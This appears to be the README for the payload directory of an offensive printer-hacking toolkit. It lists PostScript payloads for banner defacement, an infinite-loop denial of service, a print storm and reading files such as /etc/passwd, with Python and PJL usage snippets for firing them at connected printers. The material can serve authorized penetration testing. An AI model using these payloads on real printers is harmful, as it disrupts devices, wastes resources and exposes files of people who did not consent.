# PrinterXPL-Forge Payloads

Pre-built attack payloads for PostScript-enabled printers.

---

## 📋 Available Payloads

### banner.ps
**Purpose**: Print custom banner message  
**Variables**: `{{msg}}` - Message to display  
**Risk**: 🟢 Low  
**Usage**:
```python
from payloads import load_payload
payload = load_payload('banner.ps', {'msg': 'SYSTEM COMPROMISED'})
```

### loop.ps
**Purpose**: Infinite loop DoS attack  
**Variables**: None  
**Risk**: 🔴 High (requires power cycle)  
**Usage**:
```python
payload = load_payload('loop.ps')
# WARNING: Printer will hang!
```

### erase.ps
**Purpose**: Erase current page  
**Variables**: None  
**Risk**: 🟡 Medium  
**Usage**:
```python
payload = load_payload('erase.ps')
```

### storm.ps
**Purpose**: Print storm (resource exhaustion)  
**Variables**: `{{count}}` - Number of pages (default: 100)  
**Risk**: 🔴 High (wastes resources)  
**Usage**:
```python
payload = load_payload('storm.ps', {'count': '500'})
```

### exfil.ps
**Purpose**: Data exfiltration via printing  
**Variables**: `{{file}}` - File to read (e.g., /etc/passwd)  
**Risk**: 🔴 High (information disclosure)  
**Usage**:
```python
payload = load_payload('exfil.ps', {'file': '/etc/passwd'})
```

---

## 🎯 Usage in PrinterXPL-Forge

### Method 1: Via Shell

```bash
# In PostScript shell
> payload banner HACKED!
> payload loop
> payload storm 100
```

### Method 2: Programmatic

```python
from payloads import load_payload, execute_payload

# Load and customize
payload = load_payload('banner.ps', {'msg': 'Custom Message'})

# Execute on connected printer
execute_payload(printer.conn, 'banner.ps', {'msg': 'PWNED'})
```

### Method 3: Direct File

```bash
# Upload and execute
> put banner.ps
> execute @PJL ENTER LANGUAGE=POSTSCRIPT
> execute (banner.ps) run
```

---

## ⚠️ Security Warnings

**Destructive Payloads:**
- `loop.ps` - Requires power cycle
- `storm.ps` - Wastes paper and toner
- `exfil.ps` - May expose sensitive data

**Use only with authorization!**

---

## 🔧 Creating Custom Payloads

Template:
```postscript
%!PS
% Custom Payload Description
% Variables: {{var1}}, {{var2}}

% Your PostScript code here
/Helvetica findfont 12 scalefont setfont
100 700 moveto
({{var1}}) show
showpage
```

Save as `custom.ps` in `src/payloads/` directory.

---

## 📚 References

- [PostScript Language Reference](https://www.adobe.com/products/postscript/pdfs/PLRM.pdf)
- [Hacking Printers Wiki](http://hacking-printers.net)
- PrinterXPL-Forge Wiki

---

**Last Updated**: October 4, 2025  
**Version**: 2.4.0

